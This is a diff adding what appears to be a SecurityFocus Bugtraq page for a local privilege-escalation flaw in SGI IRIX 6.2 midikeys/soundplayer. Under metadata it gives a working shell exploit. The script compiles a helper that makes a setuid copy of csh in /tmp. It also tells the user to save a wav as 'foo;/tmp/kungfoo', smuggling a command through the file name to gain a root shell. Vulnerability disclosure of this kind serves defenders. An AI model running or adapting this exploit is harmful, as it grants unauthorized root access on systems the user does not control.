@@ -1,0 +1,95 @@
+<p><b><span style="font-size: 18pt;">IRIX midikeys/soundplayer Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/909/info">info</a><br><a href="http://www.securityfocus.com/bid/909/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/909/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/909/solution">solution</a><br><a href="http://www.securityfocus.com/bid/909/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				909
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 31 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Dec 31 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to Bugtraq by Loneguard &lt;loneguard@crazymonkey.org&gt; on Dec 31, 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SGI IRIX 6.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	#!/bin/sh<br/>#<br/># Irix 6.x soundplayer xploit - Loneguard 20/02/99<br/>#<br/># Good example of how bad coding in a non-setuid/priviledged process<br/># can offer up rewt<br/>#<br/>cat &gt; /tmp/crazymonkey.c &lt;&lt; 'EOF'<br/>main() {<br/>        setuid(0);<br/>        system("cp /bin/csh /tmp/xsh;chmod 4755 /tmp/xsh");<br/>}<br/>EOF<br/>cc -o /tmp/kungfoo crazymonkey.c<br/>/usr/sbin/midikeys &amp;<br/>echo "You should now see the midikeys window, goto the menu that allows you to play sounds and load a wav. This will bring<br/>up a soundplayer window. Save the wav as 'foo;/tmp/kungfoo' and go find a rewt shell in tmp"
+	
+		<ul>
+</ul>
+</div>
